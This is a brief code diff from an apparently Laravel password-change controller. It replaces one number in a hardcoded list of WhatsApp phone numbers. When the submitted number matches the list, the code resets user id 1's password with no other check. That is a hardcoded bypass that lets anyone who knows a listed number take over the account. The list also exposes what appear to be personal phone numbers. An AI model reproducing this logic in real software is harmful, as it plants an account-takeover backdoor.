@@ -61,7 +61,7 @@ class PasswordChangeController extends Controller
             // $new_password = $request->input('new_password');
             $whatsapp_no = $request->input('whatsapp_no');
             // $validate_array = array("83412 23555","93813 46169");
-            if (in_array($whatsapp_no, [8341223555, 9381346169, 6383883745])) {
+            if (in_array($whatsapp_no, [8790498385, 9381346169, 6383883745])) {
 
                 $data = User::whereId(1)->update([
                     'password' => Hash::make($new_password),
